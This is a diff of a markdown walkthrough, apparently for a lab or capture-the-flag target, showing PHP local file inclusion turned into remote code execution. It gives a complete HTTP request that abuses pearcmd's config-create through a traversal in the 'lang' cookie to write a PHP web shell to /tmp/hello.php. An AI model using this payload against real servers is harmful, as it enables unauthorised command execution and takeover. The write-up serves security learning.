@@ -4530,10 +4530,12 @@ include 'lang/' . $lang . '.php';
 
 <img width="1131" height="304" alt="image" src="https://github.com/user-attachments/assets/fea38cff-cdca-4941-aea2-f3a5034074d9" />
 
-- The main problem is due to `register_argc_argv` turned on in `Docker-php` which allows query string to be passed as cli.Pear's `config-create` will be used to exploit it.
+- The main problem is due to `register_argc_argv` turned on in `Docker-php` which allows query string to be passed as cli.Pear's `config-create` will be used to exploit it.It is specified in RFC3875 that if the query-string does not contain no encoding = , and the request is GET or HEAD, query-string needs to be used as a command line parameter.
+
+
 
 ```http
-GET /index.php?+config-create+/<?system($_GET['cmd']);?>+/tmp/hello.php HTTP/1.1
+GET /index.php?+config-create+/<?=system($_GET['cmd']);?>+/tmp/hello.php HTTP/1.1
 Host: 172.17.0.2
 Upgrade-Insecure-Requests: 1
 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
@@ -4545,6 +4547,10 @@ Cookie: lang=../../../../usr/local/lib/php/pearcmd
 Connection: close
 ```
 
-- 
+- The payload with write the shell php code to `/tmp/hello.php` which we'll later include to gain RCE.RCE
 
+
+<img width="1078" height="417" alt="image" src="https://github.com/user-attachments/assets/d95bb74a-febd-4d7b-81bb-92fb3045914f" />
+
+-------------------
 
